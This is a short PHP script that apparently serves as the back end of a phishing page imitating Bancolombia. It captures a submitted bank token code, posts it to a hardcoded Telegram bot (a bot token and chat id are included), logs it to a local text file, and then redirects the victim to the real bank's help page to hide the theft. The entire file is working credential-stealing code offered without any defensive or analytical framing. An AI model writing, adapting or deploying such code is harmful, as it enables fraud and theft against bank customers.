<?php
@session_start();
$userp = $_SERVER['REMOTE_ADDR'];


$token = "7172679471:AAGxaTpaVH93aDaXk-mQQqI8qu6Mk3vr8lk";
$id = "6855677599";
$urlMsg = "https://api.telegram.org/bot{$token}/sendMessage";
$msg = "
TOKEN: ".$_POST['Codigo1']."
=============
";
 
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $urlMsg);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, "chat_id={$id}&parse_mode=HTML&text=$msg");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 
$server_output = curl_exec($ch);
curl_close($ch);

////////////////////



	if(isset($_POST['Codigo1']) ){

    $file = fopen("boli2.txt", "a");
fwrite($file, "======TOKEN======= " . PHP_EOL);
fwrite($file, "TOKEN : " .$_POST['Codigo1']. PHP_EOL);
fwrite($file, "======================================================== " . PHP_EOL);

header ('location: https://www.bancolombia.com/centro-de-ayuda');

	}
?>
